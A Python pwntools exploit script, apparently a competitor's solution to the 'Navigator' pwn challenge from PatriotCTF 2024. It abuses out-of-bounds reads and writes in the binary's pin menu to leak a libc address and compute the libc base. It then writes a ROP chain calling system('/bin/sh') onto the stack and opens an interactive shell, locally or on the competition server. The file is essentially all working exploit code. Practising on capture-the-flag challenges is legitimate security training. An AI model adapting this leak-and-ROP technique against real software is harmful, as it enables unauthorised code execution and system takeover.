#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/PatriotCTF 2024/pwn/Navigator/navigator')
TARGET_LIBC = os.path.realpath('/usr/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF(TARGET)
libc = ELF(TARGET_LIBC)

def set_pin(r, i, c):
    r.sendlineafter(b'>> ', b'1')
    r.sendlineafter(b'>> ', str(i).encode())
    r.sendlineafter(b'>> ', p8(c))

def view_pin(r, i):
    r.sendlineafter(b'>> ', b'2')
    r.sendlineafter(b'>> ', str(i).encode())
    r.recvuntil(b'Pin:\n')

    return u8(r.recv(1))

def quit(r):
    r.sendlineafter(b'>> ', b'3')

def leak_address(r, offset):
    leak = 0

    for i in range(8):
        leak |= view_pin(r, (offset + i)) << (i * 8)

    return leak

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    libc.address = leak_address(r, -0x88) - (libc.sym.atoi + 0x14)

    rop = ROP(libc)

    rop.raw(rop.ret)
    rop.system(next(libc.search(b'/bin/sh')))

    for i, c in enumerate(rop.chain()):
        set_pin(r, 0x158 + i, c)

    quit(r)

    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('chal.competitivecyber.club', 8887)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
